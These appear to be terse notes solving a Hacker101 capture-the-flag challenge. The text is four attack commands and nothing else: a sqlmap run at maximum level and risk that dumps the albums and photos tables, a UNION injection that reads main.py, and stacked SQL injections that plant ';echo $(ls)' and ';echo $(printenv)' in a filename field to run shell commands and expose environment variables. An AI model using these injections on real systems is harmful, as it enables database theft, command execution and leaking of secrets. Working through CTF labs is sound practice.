____

```bash
sqlmap 'https://1c394af5effe9679d5c6d0805e59f099.ctf.hacker101.com/fetch?id=2' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate, br, zstd' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-Fetch-Dest: document' -H 'Sec-Fetch-Mode: navigate' -H 'Sec-Fetch-Site: cross-site' -H 'DNT: 1' -H 'Sec-GPC: 1' -H 'Priority: u=0, i' -H 'TE: trailers' --level 5 --risk 3 -p id --batch --threads 10 -T albums,photos -D level5 --dump
```

```bash
/fetch?id=4 UNION SELECT 'main.py'
```

```bash
/fetch?id=3; UPDATE photos SET filename=";echo $(ls)" WHERE id=3; commit;
```

```bash
/fetch?id=3; UPDATE photos SET filename=";echo $(printenv)" WHERE id=3; commit;
```